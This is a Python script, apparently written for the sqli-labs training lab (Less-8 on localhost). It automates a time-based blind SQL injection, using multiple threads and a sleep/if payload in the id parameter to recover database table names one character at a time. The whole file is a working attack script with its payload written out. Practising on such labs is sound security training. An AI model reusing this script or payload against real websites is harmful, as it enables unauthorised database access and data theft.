# coding:utf-8
# coding:utf-8
import requests
import datetime
import time
import threading

# 添加线程工作列表
theads_list=[]

#  定义每一个表名对应的长度列表
res_table_lens=[4,4,5,5,5]

# 定义要获取表名的数量
theads_table_num=[0,1,2,3,4]

# 定义接收的表名字典
res_table_name= {}

def table_name(len,k):
    name = ''
    now_thead = "第%d个线程" % (k + 1) # 当前的线程序号
    now_table = "第%d个表" % (k + 1)  # 当前的表名序号
    for j in range(1, len[k]+1):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz':
            url = '''http://127.0.0.1/sqli-labs-master/Less-8/'''
            payload = '''?id=1" and sleep(if((select mid(table_name,%d,1)='%s' from information_schema.tables where table_schema=database() limit %d,1),0,3))''' % (
               j, i, k)
            # print(url+payload)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            #print('timeout:', sec)
            if sec <= 1:
                name += i
                print('[+] %s--->%s: ' % (now_thead,now_table),name)
                break
    res_table_name[now_table]=name
    print(res_table_name)

# 添加线程到线程列表
for k in theads_table_num:
    theads_list.append(threading.Thread(target=table_name, args=(res_table_lens,k,)))

# 执行线程列表中的线程
for k in theads_list:
    k.start()

